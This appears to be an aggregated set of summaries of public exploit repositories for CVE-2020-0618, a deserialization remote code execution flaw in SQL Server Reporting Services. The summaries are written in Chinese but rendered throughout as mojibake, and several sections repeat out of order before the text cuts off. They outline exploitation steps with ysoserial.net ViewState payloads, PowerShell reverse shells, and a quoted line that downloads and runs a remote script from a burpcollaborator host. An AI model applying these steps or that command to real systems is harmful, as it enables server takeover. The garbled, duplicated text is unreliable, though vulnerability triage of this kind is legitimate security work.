æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
